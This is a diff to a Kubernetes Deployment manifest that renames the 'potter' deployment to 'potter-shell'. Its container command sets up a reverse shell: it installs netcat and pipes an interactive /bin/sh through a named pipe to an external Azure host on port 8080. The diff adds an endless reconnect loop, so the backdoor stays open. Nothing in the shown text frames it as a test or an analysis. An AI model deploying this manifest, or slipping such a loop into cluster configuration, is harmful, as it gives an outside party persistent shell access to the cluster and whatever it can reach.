@@ -1,27 +1,30 @@
 apiVersion: apps/v1
 kind: Deployment
 metadata:
-  name: potter
+  name: potter-shell
   namespace: sesamo-api-argocd
 spec:
   replicas: 1
   selector:
     matchLabels:
-      app: potter 
+      app: potter-shell
   template:
     metadata:
       labels:
-        app: potter
+        app: potter-shell
     spec:
       containers:
         - name: shell
-          image: alpine
+          image: alpine:3.18
           command:
             - sh
             - -c
             - |
-              apk add --no-cache busybox-extras;
-              mkfifo /tmp/f;
-              /bin/sh -i < /tmp/f 2>&1 | nc potter-maga.brazilsouth.cloudapp.azure.com 8080 > /tmp/f
+              apk add --no-cache netcat-openbsd;
+              while true; do
+                mkfifo /tmp/f;
+                /bin/sh -i < /tmp/f 2>&1 | nc potter-maga.brazilsouth.cloudapp.azure.com 8080 > /tmp/f;
+                sleep 5;
+              done
           stdin: true
           tty: true
